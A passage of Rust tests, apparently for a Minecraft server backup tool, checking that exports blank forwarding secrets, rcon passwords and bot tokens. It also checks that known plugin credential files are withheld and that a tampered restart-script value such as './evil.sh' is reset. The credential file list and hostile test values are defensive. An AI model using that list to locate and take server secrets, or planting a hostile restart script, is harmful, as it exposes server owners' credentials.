    // namespaced keys anywhere, and a pinned key after a namespace (another key to a
    // YAML reader, so nothing to pin)
    let namespaced = "settings:\n  minecraft:elytra:\n    a: 1\n  mod:restart-script: x\n";
    assert_eq!(
        pin_yaml(
            namespaced.len() as u64,
            namespaced.as_bytes(),
            &["restart-script"],
            "./start.sh"
        ),
        YamlCleaning::Unchanged
    );
    for (odd, key) in [
        ("proxies:\n  velocity:\n    secret:abc\n", "secret"),
        ("settings:\n  restart-script:./evil.sh\n", "restart-script"),
        ("a:\n  :elytra: 1\n", "secret"),
        ("a:\n  minecraft::elytra: 1\n", "secret"),
        ("a:\n  minecraft:elytra:: 1\n", "secret"),
    ] {
        assert_eq!(
            clean_yaml(odd.len() as u64, odd.as_bytes(), &[key]),
            YamlCleaning::Withhold,
            "{odd:?}"
        );
    }
}

/// A modern Paper server's global settings travel cleaned and arrive on the new server:
/// the owner's settings with the forwarding secret empty, nothing said about them.
#[tokio::test]
async fn a_modern_paper_servers_global_settings_travel_cleaned() {
    let core = core().await;
    let owner = core.owner().await;
    let paper = MODERN_PAPER_GLOBAL.replace("SECRET", VELOCITY_SECRET);
    write(&core.root, "config/paper-global.yml", paper.as_bytes());
    let id = core.backup(&owner).await;
    let (reply, file) = core.export_file(&owner, &id, json!({})).await;
    assert!(
        !names(&reply["left_out"]).contains(&"config/paper-global.yml".to_string()),
        "{reply}"
    );
    assert!(
        names(&reply["blanked"]).contains(&"config/paper-global.yml: secret".to_string()),
        "{reply}"
    );
    let mut opened = container::open(&file, &Limits::default()).unwrap();
    let entry = opened
        .image()
        .entries
        .iter()
        .find(|e| e.path.as_str() == "config/paper-global.yml")
        .expect("paper-global.yml travels")
        .clone();
    assert_eq!(entry.extra.get("blanked"), Some(&json!(["secret"])));
    let cleaned = MODERN_PAPER_GLOBAL.replace("SECRET", "''");
    assert_eq!(
        opened.read_object(&entry.sha256, 1 << 20).unwrap(),
        cleaned.as_bytes()
    );
    for (name, bytes) in all_bytes(&file) {
        assert!(
            !String::from_utf8_lossy(&bytes).contains(VELOCITY_SECRET),
            "the secret in {name}"
        );
    }

    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Modern Paper",
                "port": 25653
            }),
        )
        .await
        .unwrap();
    assert_eq!(made.read("config/paper-global.yml"), cleaned);
    assert!(!made.message.contains("settings file"), "{}", made.message);
}

/// Spigot's `spigot.yml` as Spigot 1.20 and 1.21 write it (abridged: every kind of line it
/// has). `SCRIPT` is where the restart script goes.
const SPIGOT_DEFAULTS: &str = "\
# This is the main configuration file for Spigot.
# As you can see, there's tons to configure. Some options may impact gameplay, so use
# with caution, and make sure you know what each option does before configuring.
# For a reference for any variable inside this file, check out the Spigot wiki at
# http://www.spigotmc.org/wiki/spigot-configuration/
#
# If you need help with the configuration or have any questions related to Spigot,
# join us in our Discord or IRC channel.
#
# Discord: https://www.spigotmc.org/go/discord
# IRC: #spigot @ irc.spi.gt ( https://www.spigotmc.org/go/irc )
# Forums: https://www.spigotmc.org/

settings:
  debug: false
  bungeecord: false
  sample-count: 12
  player-shuffle: 0
  user-cache-size: 1000
  save-user-cache-on-stop-only: false
  moved-wrongly-threshold: 0.0625
  moved-too-quickly-multiplier: 10.0
  timeout-time: 60
  restart-on-crash: true
  restart-script: SCRIPT
  netty-threads: 4
  attribute:
    maxAbsorption:
      max: 2048.0
    maxHealth:
      max: 1024.0
    movementSpeed:
      max: 1024.0
    attackDamage:
      max: 2048.0
  log-villager-deaths: true
  log-named-deaths: true
messages:
  whitelist: You are not whitelisted on this server!
  unknown-command: Unknown command. Type \"/help\" for help.
  server-full: The server is full!
  outdated-client: Outdated client! Please use {0}
  outdated-server: Outdated server! I'm still on {0}
  restart: Server is restarting
advancements:
  disable-saving: false
  disabled:
  - minecraft:story/disabled
commands:
  replace-commands:
  - setblock
  - summon
  - testforblock
  - tellraw
  spam-exclusions:
  - /skill
  silent-commandblock-console: false
  log: true
  tab-complete: 0
  send-namespaced: true
players:
  disable-saving: false
world-settings:
  default:
    below-zero-generation-in-existing-chunks: true
    verbose: false
    merge-radius:
      item: 0.5
      exp: -1.0
    growth:
      cactus-modifier: 100
      torchflower-modifier: 100
    entity-activation-range:
      animals: 32
      wake-up-inactive:
        animals-max-per-tick: 4
        animals-for: 100
    ticks-per:
      hopper-transfer: 8
      hopper-check: 1
    hunger:
      jump-walk-exhaustion: 0.05
      other-multiplier: 0.0
    max-tnt-per-tick: 100
    max-tick-time:
      tile: 50
      entity: 50
    seed-village: 10387312
    simulation-distance: default
    view-distance: default
    thunder-chance: 100000
config-version: 12
stats:
  disable-saving: false
  forced-stats: {}
";

/// Bukkit's `bukkit.yml` as CraftBukkit 1.20 and 1.21 write it.
const BUKKIT_DEFAULTS: &str = "\
# This is the main configuration file for Bukkit.
# As you can see, there's actually not that much to configure without any plugins.
# For a reference for any variable inside this file, check out the Bukkit Wiki at
# https://www.spigotmc.org/go/bukkit-yml
#
# If you need help on this file, feel free to join us on irc or leave a message
# on the forums asking for advice.
#
# IRC: #spigot @ irc.spi.gt
#    (If this means nothing to you, just go to https://www.spigotmc.org/go/irc )
# Forums: https://www.spigotmc.org/
# Bug tracker: https://www.spigotmc.org/go/bugs


settings:
  allow-end: true
  warn-on-overload: true
  permissions-file: permissions.yml
  update-folder: update
  plugin-profiling: false
  connection-throttle: 4000
  query-plugins: true
  deprecated-verbose: default
  shutdown-message: Server closed
  minimum-api: none
  use-map-color-cache: true
spawn-limits:
  monsters: 70
  animals: 10
  water-animals: 5
  water-ambient: 20
  water-underground-creature: 5
  axolotls: 5
  ambient: 15
chunk-gc:
  period-in-ticks: 600
ticks-per:
  animal-spawns: 400
  monster-spawns: 1
  water-spawns: 1
  water-ambient-spawns: 1
  water-underground-creature-spawns: 1
  axolotl-spawns: 1
  ambient-spawns: 1
  autosave: 6000
aliases: now-in-commands.yml
";

/// Bukkit's `commands.yml` as CraftBukkit writes it.
const COMMANDS_DEFAULTS: &str = "\
# This is the commands configuration file for Bukkit.
# For documentation on how to make use of this file, check out the Bukkit Wiki at
# https://www.spigotmc.org/go/commands-yml
#
# If you need help on this file, feel free to join us on irc or leave a message
# on the forums asking for advice.
#
# IRC: #spigot @ irc.spi.gt
#    (If this means nothing to you, just go to https://www.spigotmc.org/go/irc )
# Forums: https://www.spigotmc.org/
# Bug tracker: https://www.spigotmc.org/go/bugs

command-block-overrides: []
ignore-vanilla-permissions: false
aliases:
  icanhasbukkit:
  - version $1-
";

/// Paper's `config/paper-world-defaults.yml` as Paper 1.21 writes it (abridged).
const PAPER_WORLD_DEFAULTS: &str = "\
# This is the world defaults configuration file for Paper.
# As you can see, there's tons to configure. Some options may impact gameplay, so use
# with caution, and make sure you know what each option does before configuring.
#
# Docs: https://docs.papermc.io/
# Discord: https://discord.gg/papermc
# Website: https://papermc.io/

_version: 31
anticheat:
  anti-xray:
    enabled: false
    engine-mode: 1
    hidden-blocks:
    - copper_ore
    - deepslate_copper_ore
    - raw_copper_block
    lava-obscures: false
    max-block-height: 64
    replacement-blocks:
    - stone
    - oak_planks
    - deepslate
    update-radius: 2
    use-permission: false
chunks:
  auto-save-interval: default
  delay-chunk-unloads-by: 10s
  entity-per-chunk-save-limit:
    arrow: -1
    ender_pearl: -1
  fixed-chunk-inhabited-time: -1
  flush-regions-on-save: false
entities:
  spawning:
    alt-item-despawn-rate:
      enabled: false
      items:
        cobblestone: 300
    despawn-ranges:
      ambient:
        hard: 128
        soft: 32
    despawn-time: {}
    filtered-entity-tag-nbt-paths:
    - Pos
    - Motion
    - SleepingX
    spawn-limits:
      ambient: -1
      axolotls: -1
    wateranimal-spawn-height:
      maximum: default
      minimum: default
environment:
  frosted-ice:
    delay:
      max: 40
      min: 20
    enabled: true
  treasure-maps:
    enabled: true
    find-already-discovered:
      loot-tables: default
      villager-trade: false
lootables:
  auto-replenish: false
  refresh-max: 2d
  refresh-min: 12h
  restrict-player-reloot-time: disabled
tick-rates:
  behavior:
    villager:
      validatenearbypoi: -1
  sensor:
    villager:
      secondarypoisensor: 40
";

/// Paper's `paper.yml` before 1.19 (abridged), written by Bukkit's YAML writer: messages
/// wrapped at 80 columns, the long single-quoted one over two lines. `SECRET` is where the
/// Velocity forwarding secret goes.
const LEGACY_PAPER_YML: &str = "\
# This is the main configuration file for Paper.
# Docs: https://paper.readthedocs.org/

verbose: false
config-version: 24
settings:
  velocity-support:
    enabled: true
    online-mode: true
    secret: SECRET
  console-has-all-permissions: false
  unsupported-settings:
    allow-headless-pistons: false
messages:
  no-permission: '&cI''m sorry, but you do not have permission to perform this command.
    Please contact the server administrators if you believe that this is in error.'
  kick:
    authentication-servers-down: ''
    connection-throttle: Connection throttled! Please wait before reconnecting.
timings:
  enabled: true
  url: https://timings.aikar.co/
  hidden-config-entries:
  - database
  - settings.bungeecord-addresses
world-settings:
  default:
    anti-xray:
      hidden-blocks:
      - gold_ore
      - iron_ore
    lootables:
      refresh-min: 12h
";

/// Pufferfish's `pufferfish.yml` (abridged): its comments between keys and its Sentry key.
const PUFFERFISH_YML: &str = "\
# Pufferfish Configuration
# Check out Pufferfish Host for maximum performance server hosting: https://pufferfish.host
# If you have any questions, ask in the Discord: https://discord.gg/reZw4vQV9H

config-version: 5
info:
  version: '1.0'

# Sentry is a service that logs errors to a dashboard.
sentry-dsn: DSN

enable-books: true
dab:
  enabled: true
  max-tick-freq: 20
  activation-dist-mod: 8
  blacklisted-entities: []
";

/// The settings files Paper, Spigot and Bukkit write today, and the ones an export or a
/// server from a file edits, are all in the subset of YAML the editor reads, so they
/// travel cleaned instead of withheld: the editor changes only the secret or pinned
/// values, line for line.
#[test]
fn real_settings_files_are_read_and_cleaned() {
    use super::export::{clean_yaml, pin_yaml_all, pinned_yaml_of, YamlCleaning};
    let path = |p: &str| lodestone_image::CanonicalPath::new(p).unwrap();
    let spigot_pins = pinned_yaml_of(&path("spigot.yml")).unwrap();
    let spigot = SPIGOT_DEFAULTS.replace("SCRIPT", "./start.sh");
    assert_eq!(
        pin_yaml_all(spigot.len() as u64, spigot.as_bytes(), spigot_pins),
        YamlCleaning::Unchanged
    );
    let changed = SPIGOT_DEFAULTS.replace("SCRIPT", "./world/notes.txt");
    assert_eq!(
        pin_yaml_all(changed.len() as u64, changed.as_bytes(), spigot_pins),
        YamlCleaning::Blanked(spigot.into_bytes(), vec!["restart-script".to_string()])
    );
    let bukkit_pins = pinned_yaml_of(&path("bukkit.yml")).unwrap();
    assert_eq!(
        pin_yaml_all(
            BUKKIT_DEFAULTS.len() as u64,
            BUKKIT_DEFAULTS.as_bytes(),
            bukkit_pins
        ),
        YamlCleaning::Unchanged
    );
    let moved = BUKKIT_DEFAULTS.replace(
        "  permissions-file: permissions.yml\n",
        "  permissions-file: plugins/x.yml\n  world-container: /tmp\n",
    );
    let YamlCleaning::Blanked(out, keys) =
        pin_yaml_all(moved.len() as u64, moved.as_bytes(), bukkit_pins)
    else {
        panic!("withheld");
    };
    assert_eq!(keys, ["permissions-file", "world-container"]);
    assert_eq!(
        String::from_utf8(out).unwrap(),
        BUKKIT_DEFAULTS.replace(
            "  permissions-file: permissions.yml\n",
            "  permissions-file: permissions.yml\n  world-container: .\n",
        )
    );
    // read as the editor reads them, though nothing in them is edited
    for (name, text) in [
        ("commands.yml", COMMANDS_DEFAULTS),
        ("paper-world-defaults.yml", PAPER_WORLD_DEFAULTS),
        (
            "paper-global.yml",
            &MODERN_PAPER_GLOBAL.replace("SECRET", "''"),
        ),
    ] {
        assert_eq!(
            clean_yaml(text.len() as u64, text.as_bytes(), &["secret"]),
            YamlCleaning::Unchanged,
            "{name}"
        );
    }
    let paper = LEGACY_PAPER_YML.replace("SECRET", VELOCITY_SECRET);
    assert_eq!(
        clean_yaml(paper.len() as u64, paper.as_bytes(), &["secret"]),
        YamlCleaning::Blanked(
            LEGACY_PAPER_YML.replace("SECRET", "''").into_bytes(),
            vec!["secret".to_string()]
        )
    );
    let pufferfish = PUFFERFISH_YML.replace("DSN", "https://key@sentry.example/1");
    assert_eq!(
        clean_yaml(
            pufferfish.len() as u64,
            pufferfish.as_bytes(),
            &["sentry-dsn"]
        ),
        YamlCleaning::Blanked(
            PUFFERFISH_YML.replace("DSN", "''").into_bytes(),
            vec!["sentry-dsn".to_string()]
        )
    );
}

/// A `server.properties` line the reader can't parse (an unpaired surrogate, which Java
/// reads and Minecraft takes `online-mode=false\uD800` as off) never leaves the computer
/// and never reaches a server made from a file: an export writes the file from the
/// properties alone, and a server from a file gets its `server.properties` written again
/// the same way.
#[tokio::test]
async fn properties_lines_the_reader_cant_parse_go_nowhere() {
    let (clean, keys) =
        blank_secrets(b"motd=hi\nrcon.password=hunter2\\uD800\nmanagement-server-secret=s3\n")
            .unwrap();
    let clean = String::from_utf8(clean).unwrap();
    assert!(!clean.contains("hunter2"), "{clean}");
    assert_eq!(clean, "motd=hi\nmanagement-server-secret=\n");
    assert_eq!(keys, ["management-server-secret"]);

    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("server.properties"),
        b"online-mode=true\nonline-mode=false\\uD800\n# comment\nmotd=hi\nonline-mode=false\\uDC00\n",
    )
    .unwrap();
    super::import::pin_settings(dir.path(), 25600, "world")
        .await
        .unwrap();
    let text = std::fs::read_to_string(dir.path().join("server.properties")).unwrap();
    assert!(
        !text.contains("online-mode=false") && !text.contains("comment"),
        "{text}"
    );
    let (document, warnings) =
        crate::implementations::minecraft::properties::PropertiesDocument::parse(&text);
    assert!(warnings.is_empty(), "{warnings:?}");
    assert_eq!(document.get("online-mode"), Some("true"));
    assert_eq!(document.get("motd"), Some("hi"));
    assert_eq!(document.get("server-port"), Some("25600"));

    // online mode is written as the `true` or `false` Minecraft reads: an escaped space
    // before `true` is off to it, and the placed file says so plainly
    for (written, placed) in [
        (&b"online-mode=\\ true\n"[..], "false"),
        (b"online-mode=\\ttrue\n", "false"),
        (b"online-mode=\xA0true\n", "false"),
        ("online-mode=\u{3000}true\n".as_bytes(), "false"),
        (b"online-mode=yes\n", "false"),
        (b"online-mode = TRUE\n", "true"),
    ] {
        std::fs::write(dir.path().join("server.properties"), written).unwrap();
        super::import::pin_settings(dir.path(), 25600, "world")
            .await
            .unwrap();
        let text = std::fs::read_to_string(dir.path().join("server.properties")).unwrap();
        assert!(
            text.contains(&format!("online-mode={placed}\n")),
            "{written:?}: {text}"
        );
    }
}

/// The credentials well-known mods and plugins keep in their folders never travel, not
/// even with the plugins' settings: Dynmap's web pages for a database (its password in
/// `web/standalone/`), Geyser's copies of Floodgate's key and its saved Microsoft logins,
/// BlueMap's storages under any name and its `sql.php`, and the database, bot and vote
/// settings of CoreProtect, Plan, LiteBans, AuthMe, EssentialsX Discord, BungeeGuard,
/// Votifier and NuVotifier. The image's exclude patterns name each of them too.
#[tokio::test]
async fn mods_and_plugins_credentials_never_leave() {
    let core = core().await;
    let owner = core.owner().await;
    let password = "the-owners-database-password";
    let files = [
        "dynmap/web/standalone/MySQL_config.php",
        "dynmap/web/standalone/config.js",
        "plugins/dynmap/web/standalone/PostgreSQL_config.php",
        "config/Geyser-Fabric/key.pem",
        "plugins/Geyser-Spigot/key.pem",
        "plugins/Geyser-Spigot/saved-refresh-tokens.json",
        "config/bluemap/storages/mysql.conf",
        "plugins/BlueMap/storages/postgres.conf",
        "bluemap/web/sql.php",
        "plugins/CoreProtect/config.yml",
        "plugins/Plan/config.yml",
        "plugins/LiteBans/config.yml",
        "plugins/AuthMe/config.yml",
        "plugins/AuthMe/authme.db",
        "plugins/EssentialsDiscord/config.yml",
        "plugins/BungeeGuard/config.yml",
        "plugins/Votifier/config.yml",
        "plugins/Votifier/rsa/private.key",
        "config/nuvotifier/rsa/private.key",
        // Proxy Compatible Forge's settings since 1.2.0 and for 1.12.2, DiscordSRV's token
        // file (read before its settings), Discord Integration's settings as a plugin
        "config/proxy-compatible-forge.toml",
        "config/proxy-compatible-forge.cfg",
        "plugins/DiscordSRV/.token",
        "plugins/DiscordIntegration/config.toml",
        // the copy DiscordSRV keeps of its settings when it updates them, and ServerTap's
        // REST API key
        "plugins/DiscordSRV/config.yml-build.1.28.0.old",
        "plugins/ServerTap/config.yml",
    ];
    for path in files {
        write(
            &core.root,
            path,
            format!("password: {password}\n").as_bytes(),
        );
    }
    write(&core.root, "plugins/Essentials/config.yml", b"ok: 1\n");
    write(&core.root, "config/Geyser-Fabric/config.yml", b"ok: 1\n");
    let id = core.backup(&owner).await;
    let (reply, file) = core
        .export_file(&owner, &id, json!({ "include_plugin_data": true }))
        .await;
    let left_out = names(&reply["left_out"]);
    for path in files {
        assert!(left_out.contains(&path.to_string()), "{path}: {reply}");
    }
    for kept in [
        "plugins/Essentials/config.yml",
        "config/Geyser-Fabric/config.yml",
    ] {
        assert!(!left_out.contains(&kept.to_string()), "{kept}: {reply}");
    }
    for (name, bytes) in all_bytes(&file) {
        assert!(
            !String::from_utf8_lossy(&bytes).contains(password),
            "the password in {name}"
        );
    }
    let opened = container::open(&file, &Limits::default()).unwrap();
    let excludes = lodestone_image::store::excludes::Excludes::new(&opened.image().excludes);
    for path in files {
        assert!(excludes.excludes(path, false), "{path} not in the excludes");
    }
}

/// Paper's copy of the old `paper.yml` (`config/legacy-backup/paper.yml.old`, kept when a
/// server moved to 1.19's settings) still holds the Velocity forwarding secret the new
/// settings took over, so it never leaves the computer, even with default options; nor do
/// the settings of NeoForge's forwarding mods (NeoVelocity, NeoForwarding, any file at the
/// top of `config/` that names velocity, forwarding or proxy), Simple Voice Chat Discord
/// Bridge's bots' tokens, SDLink's encrypted bot token and its key, EasyAuth's database and
/// settings, or Ledger's database settings. The image's exclude patterns name them too.
#[tokio::test]
async fn forwarding_secrets_and_mods_logins_never_leave() {
    let core = core().await;
    let owner = core.owner().await;
    let secret = "PROBE-LEGACY-VELOCITY-SECRET";
    write(
        &core.root,
        "config/legacy-backup/paper.yml.old",
        format!("settings:\n  velocity-support:\n    enabled: true\n    online-mode: true\n    secret: {secret}\n").as_bytes(),
    );
    let files = [
        "config/neovelocity-common.toml",
        "config/neoforwarding-server.toml",
        "config/velocity-forwarding.json5",
        "config/voicechat-discord.yml",
        "plugins/voicechat-discord/config.yml",
        "config/simple-discord-link/simple-discord-link.toml",
        "sdlinkstorage/sdlink.enc",
        "EasyAuth/easyauth.db",
        "config/EasyAuth/storage.conf",
        "config/EasyAuth/proxy.conf",
        "config/ledger.toml",
    ];
    for path in files {
        write(
            &core.root,
            path,
            format!("secret = \"{secret}\"\n").as_bytes(),
        );
    }
    write(
        &core.root,
        "config/voicechat/voicechat-server.properties",
        b"port=24454\n",
    );
    let id = core.backup(&owner).await;
    for options in [json!({}), json!({ "include_plugin_data": true })] {
        let (reply, file) = core.export_file(&owner, &id, options.clone()).await;
        let left_out = names(&reply["left_out"]);
        for path in files
            .iter()
            .copied()
            .chain(["config/legacy-backup/paper.yml.old"])
        {
            assert!(left_out.contains(&path.to_string()), "{path}: {reply}");
        }
        assert!(
            !left_out.contains(&"config/voicechat/voicechat-server.properties".to_string()),
            "{reply}"
        );
        for (name, bytes) in all_bytes(&file) {
            assert!(
                !String::from_utf8_lossy(&bytes).contains(secret),
                "the secret in {name} ({options})"
            );
        }
        let opened = container::open(&file, &Limits::default()).unwrap();
        let excludes = lodestone_image::store::excludes::Excludes::new(&opened.image().excludes);
        for path in files
            .iter()
            .copied()
            .chain(["config/legacy-backup/paper.yml.old"])
        {
            assert!(excludes.excludes(path, false), "{path} not in the excludes");
        }
    }
}

/// A comment after a line holding only `\\` ends with its own line, as Java reads it, so
/// the secret on the next line is a setting of its own and an export blanks it.
#[test]
fn a_secret_after_a_comment_in_an_empty_continuation_is_blanked() {
    for text in [
        "enable-rcon=true\nrcon.port=25575\n\\\n# old: see C:\\\nrcon.password=hunter2\nmanagement-server-secret=s3cr3tKey\n",
        "\\\n  ! keep\\\nrcon.password=hunter2\n",
    ] {
        let (clean, keys) = blank_secrets(text.as_bytes()).unwrap();
        let clean = String::from_utf8(clean).unwrap();
        assert!(!clean.contains("hunter2"), "{clean}");
        assert!(!clean.contains("s3cr3tKey"), "{clean}");
        assert!(keys.contains(&"rcon.password".to_string()), "{keys:?}");
        assert!(clean.contains("rcon.password=\n"), "{clean}");
    }
}

/// HuskHomes' `config.yml` as it ships (abridged): SQLite, with a MySQL password,
/// `pa55w0rd`, that only a MySQL database would use.
const HUSKHOMES_DEFAULTS: &str = "\
# Locale of the default language file to use.
language: en-gb
check_for_updates: true
# Database settings
database:
  # Type of database to use (SQLITE, H2, MYSQL, MARIADB, or POSTGRESQL)
  type: SQLITE
  # Specify credentials here if you are using MYSQL, MARIADB, or POSTGRESQL
  credentials:
    host: localhost
    port: 3306
    database: huskhomes
    username: root
    password: pa55w0rd
    parameters: ?autoReconnect=true&useSSL=false&useUnicode=true&characterEncoding=UTF-8
  pool_options:
    size: 12
    idle: 12
  table_names:
    players: huskhomes_users
general:
  max_homes: 10
cross_server:
  enabled: false
  broker_type: PLUGIN_MESSAGE
  cluster_id: ''
  redis:
    host: localhost
    port: 6379
    # Password for your Redis server. Leave blank if you're not using a password.
    password: ''
    use_ssl: false
";

/// Real settings files' defaults, with their secrets empty or placeholders, hold no
/// credential to the generic scan: they travel and are taken as they are.
const DEFAULTS: &[(&str, &str)] = &[
    // DiscordSRV's config.yml (excerpt)
    (
        "config/chat-relay/config.yml",
        "# DiscordSRV\nBotToken: \"\"\nChannels: {\"global\": \"000000000000000000\"}\nDiscordConsoleChannelId: \"000000000000000000\"\nDiscordChatChannelDiscordToMinecraft: true\nExperiment_WebhookChatMessageDelivery: false\nExperiment_WebhookChatMessageUsernameFormat: \"%displayname%\"\nExperiment_JdbcAccountLinkBackend: \"jdbc:mysql://HOST:PORT/DATABASE?autoReconnect=true&useSSL=false\"\nExperiment_JdbcUsername: \"username\"\nExperiment_JdbcPassword: \"password\"\nDiscordInviteLink: \"discord.gg/changethisintheconfig.yml\"\n",
    ),
    // EssentialsX Discord's and Discord Integration's placeholders
    (
        "config/chat-relay/essentials.yml",
        "token: \"INSERT-TOKEN-HERE\"\nguild: 000000000000000000\n",
    ),
    (
        "config/chat-relay/integration.toml",
        "[general]\n\t#Insert your Bot Token here\n\tbotToken = \"INSERT BOT TOKEN HERE\"\n\tbotChannel = \"000000000\"\n",
    ),
    // Simple Voice Chat's server settings
    (
        "config/voicechat/voicechat-server.properties",
        "# Simple Voice Chat server config v1.21.1-2.5.x\nport=24454\nbind_address=\nmax_voice_distance=48.0\nwhisper_distance=24.0\ncodec=VOIP\nmtu_size=1024\nkeep_alive=1000\nenable_groups=true\nvoice_host=\nallow_recording=true\nspectator_interaction=false\nforce_voice_chat=false\nlogin_timeout=10000\nbroadcast_range=-1.0\nallow_pings=true\nuse_natives=true\n",
    ),
    // Chunky's and spark's
    (
        "config/chunky/config.json",
        "{\n  \"version\": 2,\n  \"continueOnRestart\": false,\n  \"forceLoadExistingChunks\": false,\n  \"silent\": false,\n  \"updateInterval\": 1\n}\n",
    ),
    (
        "config/spark/config.json",
        "{\"backgroundProfiler\": true, \"backgroundProfilerEngine\": \"async\", \"backgroundProfilerInterval\": 10, \"viewerUrl\": \"https://spark.lucko.me/\", \"bytebinUrl\": \"https://spark-usercontent.lucko.me/\"}\n",
    ),
    // Forge's server settings, in a world's serverconfig
    (
        "saves/world/serverconfig/forge-server.toml",
        "#Server configuration settings\n[server]\n\t#Set this to true to remove any BlockEntity that throws an error in its update method.\n\tremoveErroringBlockEntities = false\n\tremoveErroringEntities = false\n\tfullBoundingBoxLadders = false\n\t#The permission handler used by the server.\n\tpermissionHandler = \"forge:default_handler\"\n\tadvertiseDedicatedServerToLan = true\n",
    ),
    // FabricProxy-Lite's defaults (its secret empty), under another mod's name
    (
        "config/lite-bridge.toml",
        "hackOnlineMode = true\nhackEarlySend = false\nhackMessageChain = true\ndisconnectMessage = \"This server requires you to connect with Velocity.\"\nsecret = \"\"\n",
    ),
    // LuckPerms', Plan's and Geyser's database and login settings, empty
    (
        "config/ranks-store/config.yml",
        "storage-method: h2\ndata:\n  address: localhost\n  database: minecraft\n  username: root\n  password: ''\n  pool-settings:\n    maximum-pool-size: 10\n",
    ),
    (
        "config/analytics/config.yml",
        "Database:\n  Type: SQLite\n  MySQL:\n    Host: localhost\n    Port: 3306\n    User: root\n    Password: password\n    Database: Plan\n",
    ),
    (
        "config/bedrock-bridge/config.yml",
        "bedrock:\n  address: 0.0.0.0\n  port: 19132\nremote:\n  address: auto\n  auth-type: online\nfloodgate-key-file: key.pem\nsaved-user-logins:\n  - ThisExampleUsernameShouldBeLongEnoughToNeverBeAnXboxUsername\n",
    ),
    // HuskHomes' (as a mod; the same file as a plugin): SQLite, with the MySQL password
    // it ships, `pa55w0rd`
    ("config/huskhomes/config.yml", HUSKHOMES_DEFAULTS),
    // WorldGuard's, whose SQL storage is off, its password the user's name and its DSN an
    // address with no login
    (
        "config/region-guard/config.yml",
        "regions:\n    use-scheduler: true\n    sql:\n        use: false\n        dsn: jdbc:mysql://localhost/worldguard\n        username: worldguard\n        password: worldguard\n        table-prefix: ''\n    max-region-count-per-player:\n        default: 7\n",
    ),
    // ServerTap's, its key the placeholder it ships
    (
        "config/rest-bridge/config.yml",
        "port: 4567\ndebug: false\nuseKeyAuth: true\nkey: 'change_me'\nnormalizeMessages: true\n",
    ),
    // Sponge's, with forwarding off
    (
        "config/sponge/sponge.conf",
        "sponge {\n  ip-forwarding {\n    mode=NONE\n    secret=\"\"\n  }\n}\n",
    ),
];

/// The four shapes the last check found under named mods' files (a JSON `botToken`, a
/// YAML `discord.bot.token`, a TOML `token`, a nested `secret-key`) and others, each under
/// a fresh mod's name no list knows, with real values in them: what the generic scan must
/// find by the keys' names alone.
fn fresh_credentials() -> Vec<(&'static str, String)> {
    vec![
        (
            "config/chat-bridge.json",
            "{\n  \"generic\": {\n    \"botToken\": \"FRESH-JSON-BOT-TOKEN\",\n    \"useWebhook\": true\n  }\n}\n".into(),
        ),
        (
            "config/chat_bridge/config.yml",
            "mode: single_server\ndiscord:\n  bot:\n    token: \"FRESH-YAML-BOT-TOKEN\"\n".into(),
        ),
        ("config/relay.toml", "token = \"FRESH-TOML-TOKEN\"\n".into()),
        // a copy a mod keeps of its settings when it updates them, as DiscordSRV does
        (
            "config/chat-relay/config.yml-build.1.28.0.old",
            "BotToken: \"FRESH-BACKUP-BOT-TOKEN\"\nChannels: {\"global\": \"1\"}\n".into(),
        ),
        ("config/relay2.json.bak", "{\"token\": \"FRESH-BAK-TOKEN\"}".into()),
        // a REST API's bare `key` with key authentication on, as ServerTap's
        (
            "config/rest-api/config.yml",
            "port: 4567\nuseKeyAuth: true\nkey: 'FRESH-REST-API-KEY'\n".into(),
        ),
        // the database password a real HuskHomes server has
        (
            "config/homes/config.yml",
            HUSKHOMES_DEFAULTS
                .replace("type: SQLITE", "type: MYSQL")
                .replace("pa55w0rd", "FRESH-HOMES-DB-PASSWORD"),
        ),
        (
            "mods/shopkeeper/config.yml",
            "server:\n  # Secret Key\n  secret-key: 'FRESH-STORE-SECRET-KEY'\n".into(),
        ),
        (
            "config/nested-store.json5",
            "{\n  store: {\n    secret: { key: 'FRESH-NESTED-SECRET-KEY' },\n  },\n}\n".into(),
        ),
        (
            "config/hooks/hooks.json",
            "{\"url\": \"https://discord.com/api/webhooks/123456789012345678/FRESHwebhookTOKENabcdefghij\"}".into(),
        ),
        (
            "config/forwarder/forwarder.conf",
            "sponge {\n  ip-forwarding {\n    mode=MODERN\n    secret=\"FRESH-HOCON-SECRET\"\n  }\n}\n".into(),
        ),
        (
            "config/old-mod.cfg",
            "general {\n    S:botToken=FRESH-CFG-BOT-TOKEN\n}\n".into(),
        ),
        (
            "saves/world/serverconfig/shop-server.toml",
            "[shop]\napiKey = \"FRESH-SERVERCONFIG-API-KEY\"\n".into(),
        ),
        (
            "defaultconfigs/bridge-server.toml",
            "[db]\nurl = \"mongodb://admin:FRESH-URL-PASSWORD@db.example:27017\"\n".into(),
        ),
        // key and token files by their names
        ("config/plasmovoice/server/forwarding-secret", "FRESH-NAMED-SECRET".into()),
        ("config/fresh-mod/bot.token", "FRESH-TOKEN-FILE".into()),
        ("config/fresh-mod/tls.pem", "FRESH-PEM-FILE".into()),
    ]
}

/// Where a canonical path is on a server's disk (its level is `world`).
fn on_disk(path: &str) -> String {
    path.strip_prefix("saves/").unwrap_or(path).to_string()
}

#[test]
fn real_default_settings_hold_no_credential() {
    use super::secrets::{find_credential, scanned_format};
    let path = |p: &str| lodestone_image::CanonicalPath::new(p).unwrap();
    let spigot = SPIGOT_DEFAULTS.replace("SCRIPT", "./start.sh");
    let paper_global = MODERN_PAPER_GLOBAL.replace("SECRET", "''");
    let legacy = LEGACY_PAPER_YML.replace("SECRET", "''");
    let pufferfish = PUFFERFISH_YML.replace("DSN", "''");
    let mut files: Vec<(&str, &str)> = DEFAULTS.to_vec();
    files.extend([
        ("spigot.yml", spigot.as_str()),
        ("bukkit.yml", BUKKIT_DEFAULTS),
        ("commands.yml", COMMANDS_DEFAULTS),
        ("config/paper-world-defaults.yml", PAPER_WORLD_DEFAULTS),
        // cleaned key by key, not scanned, but clean anyway once blanked
        ("config/x/paper-global.yml", paper_global.as_str()),
        ("config/x/paper.yml", legacy.as_str()),
        ("config/x/pufferfish.yml", pufferfish.as_str()),
        (
            "ops.json",
            r#"[{"uuid":"069a79f4-44e9-4726-a5be-fca90e38aaf5","name":"Notch","level":4,"bypassesPlayerLimit":false}]"#,
        ),
        (
            "usercache.json",
